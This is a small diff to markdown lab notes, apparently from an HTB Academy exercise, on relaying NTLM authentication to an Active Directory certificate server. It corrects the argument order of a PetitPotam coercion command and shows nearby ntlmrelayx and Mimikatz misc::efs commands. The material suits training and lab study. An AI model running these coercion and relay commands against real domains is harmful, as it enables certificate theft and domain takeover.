@@ -83,7 +83,7 @@ sudo ntlmrelayx.py -debug -smb2support --target https://ACADEMY-EA-CA01.INLANEFR
 > There is a windows exe version, a PowerShell tool [Invoke-PetitPotam.ps1](https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1) or Mimikatz can do it too `misc::efs /server:[dc-ip] /connect:[atk-ip]`
 
 ```bash
-python3 PetitPotam.py [dc-ip] [atk-ip]
+python3 PetitPotam.py [atk-ip] [dc-ip]
 ```
 
 This will then cause the relay to request the CSR and the relay will return the base64 encoded cert.
